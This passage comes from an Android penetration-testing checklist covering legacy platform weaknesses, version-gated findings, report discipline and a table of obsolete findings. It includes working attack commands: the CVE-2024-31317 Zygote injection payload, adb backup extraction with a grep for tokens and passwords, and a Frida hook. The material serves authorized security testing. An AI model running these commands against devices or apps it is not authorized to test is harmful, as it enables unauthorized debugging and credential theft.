  grep -rn 'http://' out/sources/ | grep -viE 'schemas\.android\.com|w3\.org|apache\.org|localhost|127\.0\.0\.1' | head -40
  adb shell tcpdump -i any -s0 -w /sdcard/p.pcap 'tcp port 80' 2>/dev/null &   # or capture on the AP
  ```
- **Proof:** A captured HTTP request from the app carrying a token, a session cookie or PII — or the
  `cleartextTrafficPermitted="true"` element naming a real production domain.
- **Escalation:** -> D14; -> D15 for the endpoint's own weaknesses once you can read it.
- **Ruled out when:** `targetSdk >= 28`, no `usesCleartextTraffic="true"`, no
  `cleartextTrafficPermitted="true"` in any domain config, and a port-80 capture across a full drive of
  the app is empty. Record the empty pcap.

### D22-074 · LEGACY-live: minSdk < 17 — `addJavascriptInterface` reflection RCE

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) — code execution in the app's process |
| **Attacker** | AM-02 (attacker-controlled content in the WebView) / AM-06 |
| **Applies to** | **minSdk < 17 only.** The gate is `minSdkVersion`, not target. From API 17 only `@JavascriptInterface`-annotated methods are reachable |
| **Maps to** | MASTG-TEST-0334 (Native Code Exposed Through WebViews), MASTG-KNOW-0018; `privacy-and-security/risks/insecure-webview-native-bridges`; ATT&CK T1407 |

- **Test:** Below minSdk 17, every public method of an injected bridge object is callable from
  JavaScript, which yields the `getClass().forName("java.lang.Runtime")` chain to `Runtime.exec`. Above
  it, the class is dead as a *default* — but the bridge is still there and its annotated methods are
  still worth rating by what they return (that is D10's work, not this item's).
- **How:**
  ```bash
  MIN=$(aapt2 dump badging base.apk | grep -oE "sdkVersion:'[0-9]+'" | grep -oE '[0-9]+'); echo "minSdk=$MIN"
  [ "$MIN" -lt 17 ] || echo "NOT APPLICABLE as a reflection RCE — the annotated-method surface is D10's"
  grep -rn 'addJavascriptInterface' out/sources/ -B4 -A8
  grep -rn '@JavascriptInterface' out/sources/ | wc -l
  ```
- **Proof:** On a minSdk < 17 app, the reflection chain executing a command from injected JavaScript,
  with the command's output observable (a file created under the app's data directory, for example).
- **Escalation:** -> D10 for the bridge census and the cross-origin reachability work, which is where the
  modern finding lives.
- **Ruled out when:** `minSdk >= 17`. Quote the integer; then hand the bridge to D10, because
  `@JavascriptInterface` methods are still usually enough for token theft.

### D22-075 · LEGACY-live: targetSdk < 30 — free package visibility, and why it changes discovery not delivery

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) when the installed-app inventory is transmitted |
| **Attacker** | AM-03 |
| **Applies to** | **targetSdk <= 29** for free enumeration; from 30 it requires `<queries>` or `QUERY_ALL_PACKAGES` |
| **Maps to** | `training/package-visibility` (filtered APIs `queryIntentActivities()`, `getPackageInfo()`, `getInstalledApplications()`, `resolveActivity()`, `bindService()`; Google "treats the list of installed apps as personal and sensitive user data" and requires Play approval for `QUERY_ALL_PACKAGES`); ATT&CK T1418 |

- **Test:** Two directions. If the app under test targets 29 or lower, it can enumerate every installed
  package with no declaration, and the finding is the transmission of that inventory off-device. If it
  targets 30+, the finding is `QUERY_ALL_PACKAGES` held without a justification Play would accept. And
  the correction that keeps other domains honest: filtering changes **discovery, not delivery** — an
  attacker who already knows the package name still reaches the target with an explicit `ComponentName`
  or a `VIEW` intent, with no `<queries>` entry at all.
- **How:**
  ```bash
  grep -n 'QUERY_ALL_PACKAGES\|forceQueryable' out/AndroidManifest.merged.xml
  xmllint --format out/AndroidManifest.merged.xml | sed -n '/<queries>/,/<\/queries>/p'
  grep -rnE 'getInstalledPackages|getInstalledApplications|queryIntentActivities|resolveActivity' out/sources/
  # and the delivery control, from a stub app targeting 30+ with no <queries>:
  adb shell am start -n com.victim/.InternalActivity
  ```
  ```javascript
  Java.perform(function () {
    var PM = Java.use('android.app.ApplicationPackageManager');
    PM.getInstalledPackages.overload('int').implementation = function (f) {
      var r = this.getInstalledPackages(f);
      console.log('[pkgenum] size=' + r.size());
      return r;
    };
  });
  ```
- **Proof:** The hook's package count matching a list in a Burp request body — that is the transmission,
  and it is the finding. Separately, the exploit succeeding from a PoC app targeting 30+ with no
  `<queries>` entry, which is what keeps D04-D09 correctly rated against modern targets.
- **Escalation:** -> D20 for the inventory exfiltration; -> D01 for the `<queries>` block as a map of the
  app's intended IPC peers (each named peer is a D06 impersonation candidate).
- **Ruled out when:** `targetSdk >= 30`, no `QUERY_ALL_PACKAGES`, and the `<queries>` block names only
  peers the app demonstrably binds. List them.

### D22-076 · LEGACY-live: device <= Android 11 — `adb backup` still yields app data

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `mobile_security_misconfiguration.auto_backup_allowed_by_default` (P5) standalone; `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the extracted token authenticates to an internet-facing API |
| **Attacker** | AM-11 |
| **Applies to** | **device Android 11 and lower**; Android 12 gutted it and 13+ is effectively dead unless the app is debuggable (D22-013) |
| **Maps to** | MASTG-TECH-0128 (Performing a Backup and Restore of App Data), MASTG-TEST-0262; `guide/topics/data/autobackup` |

- **Test:** `adb backup` extraction is the most over-reported dead technique in the corpus. It is live
  on Android 11 and lower, and on modern devices only through the `android:debuggable` escape hatch. Test
  it on the minSdk image from D22-003, not on your current device, and state which.
- **How:**
  ```bash
  adb shell getprop ro.build.version.sdk        # must be <= 30 for the LEGACY path
  grep -nE 'allowBackup|fullBackupContent|dataExtractionRules' out/AndroidManifest.merged.xml
  adb backup -f /tmp/b.ab -noapk com.target.app && ls -l /tmp/b.ab
  dd if=/tmp/b.ab bs=24 skip=1 2>/dev/null | zlib-flate -uncompress | tar xvf - -C /tmp/bk
  grep -rnE 'token|bearer|refresh|session|password|secret' /tmp/bk/ | head -20
  ```
- **Proof:** The extracted tar containing `shared_prefs/*.xml` or `databases/*.db` with a token in it,
  and that token then used against the API from `curl`. Quote the device API level next to it.
- **Escalation:** -> D11 storage; -> D13 session takeover. Note the cloud and D2D variants are D22-014,
  which is the **current** form of this class.
- **Ruled out when:** The tested device is Android 12+ and the app is not debuggable — record the
  header-only `.ab` size. On Android 11 and lower, ruled out only by an empty backup set, which means
  `allowBackup="false"` or an exhaustive `<exclude>` list; quote it.

### D22-077 · LEGACY: Zygote `--runtime-flags` command injection (CVE-2024-31317)

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.privilege_escalation` (null) — it is a platform bug, reported to the OEM/Google, not to the app vendor |
| **Attacker** | a principal holding `WRITE_SECURE_SETTINGS` — normally ADB or an OEM-privileged app; **not** AM-03 |
| **Applies to** | **LEGACY** — Android 9 through 14 below the June 2024 patch level. Fixed in the June 2024 Android Security Bulletin (`ZygoteCommandBuffer` hardened) |
| **Maps to** | CVE-2024-31317 (Zygote `--runtime-flags` command injection) |

- **Test:** On an unpatched device, a principal with `WRITE_SECURE_SETTINGS` can force **arbitrary** apps
  to start with `DEBUG_ENABLE_JDWP`, with no APK modification and no boot-image change. Relevant to an
  app engagement in exactly one way: it tells you whether "the app is not debuggable" is a real boundary
  on the client's fleet. Record the patch level; do not file it against the app.
- **How:**
  ```bash
  adb shell getprop ro.build.version.security_patch     # < 2024-06-01 on Android 9-14 => affected
  adb shell settings put global hidden_api_blacklist_exemptions "--runtime-flags=0x104|Lcom/example/Fake;->entryPoint:"
  adb shell monkey -p com.target.app 1
  adb jdwp
  adb forward tcp:8700 jdwp:<pid>
  jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=8700
  ```
  `0x104` = `DEBUG_ENABLE_JDWP | DEBUG_JNI_DEBUGGABLE`; the crafted value breaks the parser out of its
  fast path so a second synthetic command is accepted as if the framework had supplied it.
- **Proof:** `adb jdwp` listing the victim's PID and `jdb` attaching to a non-debuggable release build,
  with the device patch level quoted.
- **Escalation:** Note it as a caveat against any "requires root" severity reduction the client proposes:
  on an unpatched fleet, memory inspection of any app is available to a `WRITE_SECURE_SETTINGS` holder.
  Mitigations to record: patch to 2024-06-01 or later; restrict `WRITE_SECURE_SETTINGS` and ADB access;
  enforce `ro.debuggable=0` on MDM fleets. `adb disable-verifier` controls APK verification and is **not**
  a defence against this.
- **Ruled out when:** `ro.build.version.security_patch` is 2024-06-01 or later, or the device is Android
  15+. Quote the property.

### D22-078 · The three-line preconditions block on every version-gated finding

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — report quality, which directly determines the triager's rating |
| **Attacker** | n/a |
| **Applies to** | every finding derived from this chapter or gated by it |
| **Maps to** | the version-gating structure of every behaviour-change page; the HackerOne report shape in D22-001; the Google Mobile VRP non-qualifying clause "Vulnerabilities that do not work on the latest available operating system version" |

- **Test:** Every version-gated report must state three things: the device OS you proved it on; the app's
  targetSdk and the targetSdk at which the behaviour change applies; and any user action the attacker
  needs (restricted-settings approval, notification-listener enable, sideload). Omitting any of the three
  is the most common reason a modern Android report is downgraded.
- **How:**
  ```bash
  adb shell getprop ro.build.version.sdk ; adb shell getprop ro.build.version.release
  adb shell getprop ro.build.version.security_patch
  adb shell dumpsys package com.target.app | grep -E 'targetSdk|versionName|versionCode'
  adb shell getprop | grep build.version.extensions
  ```
  Paste the resulting block verbatim into the finding:
  ```
  Proved on:        Android 16 (API 36), patch 2026-08-01, <ro.build.fingerprint>
  App:              com.target.app <versionName> (<versionCode>), minSdk N, targetSdk M
  Behaviour gate:   applies at targetSdk >= M0 / device API >= D0; M >= M0, so the finding is CURRENT
  User interaction: none / one tap on <x> / restricted-settings approval (N taps, see recording)
  ```
- **Proof:** The block itself, present in every version-gated finding, and matching `lab/platform-baseline-API<NN>.txt`.
- **Escalation:** -> D27 reporting.
- **Ruled out when:** n/a — it is unconditional on every affected finding.

### D22-079 · Prove the platform-mitigated negative explicitly

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — it is what stops a P5 being filed as a High |
| **Attacker** | n/a |
| **Applies to** | every classic finding that a modern platform blocks |
| **Maps to** | `about/versions/12/behavior-changes-all`, `.../14/behavior-changes-14`, `.../16/behavior-changes-16`; `privacy-and-security/risks/intent-redirection` (Android 16 default hardening) |

- **Test:** Several classic Android findings are blocked by default on modern devices: tapjacking
  through most overlay types (Android 12), implicit intents reaching non-exported components (targetSdk
  34), zip-slip through `ZipFile`/`ZipInputStream` (targetSdk 34), nested intent redirection (Android 16).
  If you cannot show the payload landing, the report is Informational — and the correct output is a
  *documented negative*, not silence.
- **How:** Run the PoC, capture the platform's refusal (the strings in D22-008), then write one of two
  sentences:
  - "No finding on current platforms: the payload is refused by <named platform behaviour> at
    <API level>, logcat line quoted."
  - "Finding is limited to targetSdk < N / Android < N. The client's install base below that level is
    X% (source: client distribution data, requested <date>)."
  ```bash
  # ask for the distribution data; without it, state the limitation without a percentage
  ```
- **Proof:** The refusal log line alongside the attempted payload, both in the ruled-out register.
- **Escalation:** -> D27; the documented negative is a deliverable that proves coverage.
- **Ruled out when:** n/a — unconditional on every platform-mitigated class you tested.

### D22-080 · Do not retract when the platform changed under you mid-engagement

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — it preserves a real finding that would otherwise be discarded |
| **Attacker** | n/a |
| **Applies to** | any engagement running across a Google Play system update, an app update, or a device that took an OTA |
| **Maps to** | the bug-hunting corpus's retraction discipline and its explicit counterpart ("do not retract a confirmed finding just because it stopped reproducing — assume the client patched"); the ART/Conscrypt Mainline update mechanism in D22-061 |

- **Test:** A version-gated PoC can stop reproducing for three different reasons, and they demand three
  different responses. (a) The app was patched mid-engagement — keep the finding, with timestamped
  pre-patch evidence. (b) The **platform** changed under you: a Google Play system update pushed a new
  Conscrypt or ART module, or the device took an OTA — keep the finding, and re-state the precondition
  with the old and new module versions. (c) The finding was never real — retract it properly, in the
  appendix, with the disproving evidence. Confusing (b) with (c) discards real work; confusing (c) with
  (a) or (b) is how a report loses credibility.
- **How:** Record the module and build state at first reproduction and again at the failure, then
  compare:
  ```bash
  adb shell getprop ro.build.fingerprint ro.build.version.security_patch
  adb shell dumpsys package com.android.conscrypt | grep -iE 'versionCode|versionName'
  adb shell dumpsys package com.android.art       | grep -iE 'versionCode|versionName'
  adb shell dumpsys package com.target.app        | grep -iE 'versionCode|versionName|lastUpdateTime'
  ```
  If the app's `versionCode`/`lastUpdateTime` moved, it is (a). If a module or fingerprint moved and the
  app did not, it is (b). If nothing moved, treat it as (c) and use the retraction template:
  ```markdown
  ### Retracted: <finding name>
  - **Original signal:** <what looked like a bug>
  - **Disproving evidence:** <reproduction step + observation that disproves it>
  - **Why it looked like a bug:** <root cause of the FP>
  - **Retraction date:** <YYYY-MM-DD>
  ```
- **Proof:** The two state dumps with timestamps, plus the pre-change request/response or screen capture.
- **Escalation:** -> D27. A clean report with a retraction appendix is more trustworthy than a longer one
  where findings fall apart at triage; equally, a self-retraction of a real finding is a loss.
- **Ruled out when:** n/a — it is a decision procedure, run whenever a confirmed PoC stops reproducing.

### D22-081 · File version-gated primitives before their consumer

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — submission strategy |
| **Attacker** | n/a |
| **Applies to** | every chain in which a D22 opt-out is the precondition for another domain's finding |
| **Maps to** | the bug-hunting corpus's chain-filing order and the "one fix = one bounty" framing |

- **Test:** A hardening opt-out found here (`removeLaunchSecurityProtection()`,
  `ZipPathValidator.clearCallback()`, `intentMatchingFlags="none"`, a re-registered BC provider) has an
  **independent fix surface** from the consumer finding it enables. File it as its own report so the
  fix — and the bounty — is counted separately, then reference it from the consumer.
- **How:** (1) Identify the highest-severity chained outcome. (2) File each primitive as a separate
  report at its standalone severity, leaving a placeholder cross-reference. (3) File the chain consumer
  with the full narrative at the chained severity, filling in the real primitive ids. (4) Edit each
  primitive to backfill the consumer's id. Consumer body:
  ```markdown
  ## Chain partners (filed as separate reports)
  - **submission [UUID-1]** — Android 16 intent-redirection hardening disabled via
    `Intent.removeLaunchSecurityProtection()` in <class>
  - **submission [UUID-2]** — non-exported <component> reachable once the hardening is removed
  These primitives have independent fix surfaces and are filed separately per the programme's
  "one fix = one bounty" rule.
  ```
  Do not paste the whole chain narrative into every primitive, do not claim each primitive is
  independently P1, and do not file everything within minutes of each other.
- **Proof:** Cross-referenced ids in both directions.
- **Escalation:** -> D27.
- **Ruled out when:** n/a — it is a procedure, applied whenever a D22 item is the precondition for
  another domain's report.

### D22-082 · Check the programme's OS-version floor before spending the day

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — eligibility control |
| **Attacker** | n/a |
| **Applies to** | every bug-bounty engagement; less relevant for a pure client assessment, where the client's own fleet is the floor |
| **Maps to** | Google Mobile VRP non-qualifying: "Vulnerabilities that do not work on the latest available operating system version"; Xiaomi: "Attacks that are only available in lower versions of Android"; YesWeHack's Gojek programme, which excludes verbatim "Exploits that are only possible on Android version 8 and below", "Exploits that are only possible on IOS version 14 and below", "Exploiting a generic Android or iOS vulnerability" and "Vulnerabilities requiring physical access to a user's smartphone" |

- **Test:** Programmes set an OS-version floor and a physical-access exclusion. A LEGACY-live finding can
  be technically correct, reproducible, and entirely out of scope. Read the brief before you build the
  minSdk image, not after.
- **How:**
  ```bash
  adb shell getprop ro.build.version.release ro.build.version.sdk ro.product.model
  ```
  Then read the programme's non-qualifying list and record: the OS-version floor; whether physical access
  is excluded; whether "generic Android vulnerability" is excluded (which rules out the platform CVEs in
  D22-077). For a client assessment rather than a bounty, substitute the client's own supported-device
  matrix and ask for the install-base distribution.
- **Proof:** The `getprop` output captured alongside the PoC video, plus the quoted programme clause in
  the engagement's scoping note.
- **Escalation:** Where a LEGACY finding falls below the floor, it goes in the client report flagged
  LEGACY rather than being dropped silently — a client on `minSdk 24` may still care about it even when
  the bounty programme will not pay for it.
- **Ruled out when:** n/a — it is a scoping step, run once per engagement at Gate 2.

## Graveyard for this domain

Every row here is a class the corpus's circulating checklists still present as current. Each is dead
unconditionally at the stated level, or dead as a *default-driven* finding. Do not file them; cite this
table when a junior tester or a scanner report proposes one.

| Observation | Why it is not a finding | What would make it one |
|---|---|---|
| "`android:exported` is missing, so the component is exported" on a targetSdk 31+ app | The app cannot install on Android 12+ without the attribute — the absence you are reporting does not exist in the shipped build | An explicit `android:exported="true"` with no `android:permission` on a component that performs a state change (D22-011) |
| "`<provider>` defaults to exported" on a targetSdk 17+ app | The default has been `false` since Android 4.2 when no `<intent-filter>` is present | An explicit `exported="true"` provider, or a `grantUriPermissions` path — D07's work, not a default (D22-071) |
| "The app trusts user-installed CAs" on a minSdk 24+ app with no NSC opt-in | Untrusted by default since API 24; you installed the CA as a tester (AM-07), which is not an attacker model | An explicit `<certificates src="user"/>` or a `<debug-overrides>` block in the release build (D22-072) |
| "Cleartext traffic is allowed" on a targetSdk 28+ app with no override | Blocked by the default network security config since API 28 | `usesCleartextTraffic="true"` or a `cleartextTrafficPermitted="true"` domain config naming a production host (D22-073) |
| "`addJavascriptInterface` allows reflection to `Runtime.exec`" on a minSdk 17+ app | From API 17 only `@JavascriptInterface`-annotated methods are reachable; the reflection chain is gone | The annotated bridge methods themselves, rated by what each one returns — D10, not this (D22-074) |
| "`MODE_WORLD_READABLE`/`MODE_WORLD_WRITEABLE` file modes" | Throws `SecurityException` from API 24, and SELinux blocks cross-app `/data/data` access regardless of the DAC bits | Nothing at API 24+. Below it, a world-readable file containing a secret, proved by reading it from a second app |
| "The app sends sticky broadcasts" | Deprecated at API 21; third-party apps can no longer send them | Nothing. A system or OEM sender is D25's surface |
| "`adb backup` extracts the app's data" on an Android 12+ device | Gutted in Android 12 and effectively dead on 13+ unless the app is debuggable | Either an Android 11-or-lower device (D22-076), or `android:debuggable="true"` in the release build (D22-013), or the D2D path (D22-014) |
| "StrandHogg 2.0 (CVE-2020-0096)" on Android 10+ | Patched by back-port into Android 8.0/8.1/9 at the May 2020 patch level; Android 10 and later are not affected | Nothing on a supported device. StrandHogg 1.0 shapes need re-confirmation on the target's own targetSdk, and the platform-level task-affinity fix lands at API 30 |
| "Tapjacking via an overlay" on Android 12+ | Touches from another UID's non-trusted overlay at opacity >= 0.8 are dropped by default | An overlay under the opacity threshold that still steers a state-changing tap, filed through the action it causes, not as tapjacking (D22-016) |
| "SafetyNet Attestation is bypassable" | The API was fully turned down in January 2025 and now always fails | The app still calling it **and failing open** — which is a live High, filed as an integrity-gate bypass (D22-065) |
| "Implicit intents reach the app's internal components" on a targetSdk 34+ app | Implicit intents are delivered only to exported components from targetSdk 34 | A component newly exported to absorb the implicit send (D22-031), or an implicit *send* that leaks its payload to any app |
| "Zip path traversal in the app's extractor" on a targetSdk 34+ app with no opt-out | `ZipFile`/`ZipInputStream` throw `ZipException` on `..` and leading `/` by default | `ZipPathValidator.clearCallback()` present (D22-034), or an extractor that does not use the platform zip classes at all |
| "Nested intent redirection" on Android 16, blocked in your PoC | Hardened by default for all apps since Android 16 | `removeLaunchSecurityProtection()` present (D22-052), or a demonstration on the client's supported older fleet with the population stated |
| "Background clipboard read" | Blocked since Android 10; the access toast lands at API 31 | A foreground read of another app's clip on first paste, or the app placing a secret on the clipboard without `EXTRA_IS_SENSITIVE` (API 33+) — D11's work |
| "`READ_EXTERNAL_STORAGE` gives access to all media" on an API 33+ device | The permission has no effect from API 33; `READ_MEDIA_*` replaced it | The granular permissions taken instead of the Photo Picker (D22-021) |
| "`setAllowFileAccess` defaults to true" on a targetSdk 30+ app | Default is `false` from API 30 | An explicit `setAllowFileAccess(true)` call site — D10's |
| "The BouncyCastle provider is deprecated" | Deprecated at API 28, removed at API 31 — a deprecation is not a vulnerability | A bundled `bcprov` re-registered at provider position 1, restoring parameters the platform refuses (D22-017) |
| "The app targets an old SDK" with no further analysis | On its own this is `using_components_with_known_vulnerabilities.outdated_software_version` (P5), and on Android 14/15 the app may not even install | The enumerated list of legacy-permissive defaults the low target re-enables, each with a reproduced PoC (D22-004) |
| "The app does not check `Build.VERSION.SDK_INT`" | MASTG-TEST-0245's failure condition is a hardening/quality item, Informational under a bounty rating | A specific version-gated control (`setHideOverlayWindows`, `EXTRA_IS_SENSITIVE`, `DETECT_SCREEN_CAPTURE`) that is never used on devices that support it, **plus** the exposure that results |
| "A platform CVE affects this device" (CVE-2024-31317, CVE-2025-48543, CVE-2025-38352 and similar) | These are OS bugs. They are reported to Google or the OEM, not to the app vendor, and most programmes exclude "generic Android vulnerabilities" | Nothing in an app engagement. Record the patch level in the environment section so triage does not conflate the two, and note it as a caveat against a "requires root" severity reduction (D22-077) |

## Cross-surface joins

- **The version matrix × the WebView setting defaults (D10).** Nobody re-reads `setAllowFileAccess`,
  `setAllowFileAccessFromFileURLs` and `setAllowUniversalAccessFromFileURLs` against the app's *actual*
  min/target pair — they read the modern defaults and move on. `setAllowContentAccess` defaults to
  **true at every API level**, which is the join: on a modern target where `file://` payloads are dead by
  default, `content://` payloads into the same sink are still live, and D10's file-access triage usually
  stops before it gets there.
- **The merged manifest × the SDK that demanded a legacy attribute (D17/D18).** An AAR can inject
  `requestLegacyExternalStorage`, `usesCleartextTraffic="true"`, `QUERY_ALL_PACKAGES`, a
  `foregroundServiceType` or a `<uses-sdk-library>` into the app's effective manifest. The app team
  reviews their own manifest; the SAST reviews the source tree; nobody diffs the **merged** manifest
  against it. `manifest-merger-release-report.txt` names the responsible dependency, which turns a
  posture observation into an attributable supply-chain finding.
- **Split APKs × the exported-component census (D01/D04).** The component inventory is built from
  `base.apk` and the version gates are applied to `base.apk`'s target — but a dynamic feature split ships
  its own manifest with its own exported components, delivered post-install, reviewed by nobody. Join
  `pm path` against the census: any component in a split and absent from base is unreviewed exported
  surface (D22-063).
- **Platform hardening opt-outs × the sink they re-open (D07/D08/D17).** `removeLaunchSecurityProtection()`
  is greppable in a minute; the non-exported provider it reaches is in D07's inventory; nobody joins the
  two because the grep belongs to a "version behaviour" checklist and the provider to an "IPC" one. The
  same join applies to `ZipPathValidator.clearCallback()` × D17's extractor inventory, and
  `intentMatchingFlags="none"` × D05's receiver census.
- **The Conscrypt APEX split × the RASP trust-store check (D14/D21).** The interception-detection code
  in a banking app was written before Android 14 and hashes `/system/etc/security/cacerts`. The MitM
  harness section of every checklist tells you to place a CA in the APEX path. Put those two facts
  together and the app's flagship anti-MitM control is blind by construction — a finding neither the
  networking review nor the RASP review produces alone (D22-035).
- **Force-stop PendingIntent cancellation × the D08 PoC procedure.** Android 15 cancels every
  PendingIntent when an app is force-stopped. Testers routinely `am force-stop` between setting up a
  PendingIntent and triggering it, conclude "not reproducible", and close a real D08 finding. The join is
  purely procedural and it silently destroys findings (D22-046).
- **Notification permission × the account-security alert channel (D13/D24).** The auth review tests
  whether a password change requires re-authentication; the notification review tests whether
  notifications leak data on the lock screen. Neither asks whether the "your password was changed" alert
  has any delivery channel other than a notification the user declined on Android 13+ — which converts a
  detectable takeover into a silent one (D22-019).
- **Restricted Settings × every accessibility/notification-listener PoC (D21/D27).** A PoC that needs an
  accessibility service is AM-03 on Android 12 and AM-04-with-significant-interaction on Android 13+.
  The exploitation chapter builds the PoC; the reporting chapter assigns the attacker model; nobody
  re-checks the sideload gate in between, and the severity is wrong in both directions (D22-023).
- **Predictive back × the payment-confirmation screen (D23/D11).** The payments review tests the
  transaction flow; the storage review tests what persists. Neither tests what a *back gesture* does at
  targetSdk 36, where `onBackPressed()` is no longer called — so the "clear the card buffer on back"
  control stopped running without a code change and without a failing test (D22-055).
- **Key attestation root rotation × the backend verifier (D12/D15).** A new EC-based attestation root
  signs chains from 1 February 2026, and Android 16 devices use RKP with deliberately short-lived
  certificates. The mobile review tests the device side; the API review tests authorisation. The join is
  the verifier's trust list and expiry handling, which belongs to neither and breaks or fails open on a
  schedule (D22-067).

## Sources

- `developer.android.com/about/versions/{12,13,14,15,16}/behavior-changes-{all,12,13,14,15,16}` — every
  targetSdk-gated and device-gated change cited in this chapter, including the verbatim logcat strings,
  compat-change names and opt-out APIs.
- `developer.android.com/privacy-and-security/risks/*` — `android-exported`, `android-debuggable`,
  `pending-intent`, `intent-redirection`, `dynamic-code-loading`, `zip-path-traversal`, `path-traversal`,
  `insecure-webview-native-bridges`, `unsafe-trustmanager`, `unsafe-hostname`,
  `broken-cryptographic-algorithm`, `create-package-context`, `test-debug`, `strandhogg`,
  `secure-clipboard-handling`, `sender-of-pending-intents`, `backup-best-practices`.
- `developer.android.com` feature and guide pages: `guide/sdk-extensions`, `training/package-visibility`,
  `training/data-storage/shared/photopicker`, `guide/topics/data/autobackup`, `guide/topics/data/audit-access`,
  `develop/background-work/services/fgs/service-types`, `guide/app-bundle/play-feature-delivery`,
  `guide/components/activities/background-starts`, `guide/navigation/custom-back/predictive-back-gesture`,
  `guide/components/intents-filters`, `guide/components/broadcasts`, `guide/app-compatibility/test-debug`,
  `develop/ui/views/notifications/notification-permission`, `identity/sign-in/credential-manager`,
  `privacy-and-security/security-config`, `privacy-and-security/security-key-attestation`,
  `privacy-and-security/safetynet/deprecation-timeline`, `google/play/integrity/overview`,
  `about/versions/14/features/screenshot-detection`, `about/versions/15/features`,
  `about/versions/16/features`, `health-and-fitness/guides/health-connect*`.
- `source.android.com/docs/core/ota/modular-system/conscrypt` (the APEX trust-store move and both
  cacerts paths); `source.android.com/docs/security/app-sandbox` (per-app SELinux sandbox at
  targetSdk 28, the targetSdk 24 home-directory mode change); the AOSP security-model paper Tables 2
  and 3 (the platform mitigation timeline).
- `privacysandbox.google.com/private-advertising/sdk-runtime` (SDK Runtime isolation properties,
  `SdkSandboxManager`, `<uses-sdk-library>` and `certDigest`).
- OWASP MASTG/MASVS: MASTG-TEST-0245, -0285, -0235, -0381, -0315, -0340, -0262, -0312, -0224, -0393,
  -0399, -0217, -0250, -0252, -0253, -0334, -0203, -0222, -0307, -0326, -0328, -0330, -0242;
  MASTG-TECH-0043, -0128, -0141, -0150, -0160, -0161, -0162, -0163, -0174; MASTG-KNOW-0014, -0018,
  -0024, -0042, -0046, -0117, -0132, -0133, -0134; rules `mastg-android-sdk-version`,
  `mastg-android-strictmode`, `mastg-android-pendingintent-mutable`; MASWE-0041, -0042, -0046, -0026,
  -0030, -0032; MASVS-CODE-1, MASVS-CODE-3, MASVS-PLATFORM-1.
- MITRE ATT&CK Mobile: T1633.001, T1632, T1661, T1407, T1409, T1418, T1420, T1422, T1424, T1426,
  T1414, T1429, T1512, T1626, T1628.001, T1624.001, T1635.001, T1641.001, T1417.002; mitigation M1006
  (Use Recent OS Version), which ATT&CK attaches technique-by-technique.
- Bugcrowd VRT release 2026-07-08 (`data/bugcrowd-vrt-full.csv`, 581 entries) for every rating in this
  chapter, including the confirmation that the entire `mobile_security_misconfiguration` branch is P5
  and that `broken_access_control.exposed_sensitive_android_intent` carries a null priority.
- Programme rules: Google Mobile VRP and the Android & Google Devices programme (non-qualifying
  "vulnerabilities that do not work on the latest available operating system version"; in-scope
  "Multi-User & Private Space" and "Enterprise Bypasses"); Xiaomi ("attacks that are only available in
  lower versions of Android"); YesWeHack's Gojek programme (the Android 8 / iOS 14 floors and the
  physical-access exclusion); Samsung's severity table.
- Disclosed reports and write-ups referenced for report shape and version framing: HackerOne #2553411
  (Basecamp) and #1737358 (Shopify), both of which open with the package/min/target SDK block;
  CVE-2024-31317 (Zygote `--runtime-flags` injection, fixed June 2024); CVE-2020-0096 (StrandHogg 2.0,
  back-ported May 2020); CVE-2024-45240 (the Android 12+ limitation on unverified https deep links).
- The research corpus assembled for this checklist:
  `research/frontier/modern-api-surfaces.md` (the primary source for Android 12-16 API surfaces),
  `research/architecture/{framework-internals,security-model,aosp-core}.md`,
  `research/local/skill-corpus-{classes,method}.md`, `research/primary/{owasp-mastg,owasp-mobile-top10,
  mitre-attack-mobile,bugcrowd-vrt-severity,vrp-program-economics,exploitdb-cve-patterns,
  mobilehackinglab}.md`, `research/secondary/{claude-bughunter,hrishikesh-hacktricks,
  indusface-singh-riya,sallam-hetmehta,frida-drozer-tooling,extra-community-sources,sehno-gowthams,
  writeups-realfinds}.md`, `research/realworld/{h1-disclosed-mobile,bugcrowd-intigriti-writeups,
  crossplatform-frameworks,sdk-supplychain-cves}.md`, `research/gaps-gap-{adversary,coverage,workflow}.md`.
- The bug-hunting corpus (`research/secondary/claude-bughunter.md`) for the cross-cutting discipline
  applied here: the layer-ordering trap (re-cast as platform-block versus app-block in D22-005), the
  Body-Diff Rule and Marker Discipline (D22-006, D22-034, D22-066), the shadow-API behavioural-diff rule
  (D22-006), the Shell-Loop Ban (D22-003), the pre-severity gate and retraction discipline (D22-080),
  the five-screenshot state-change pattern (D22-019, D22-069) and chain-filing order (D22-081).
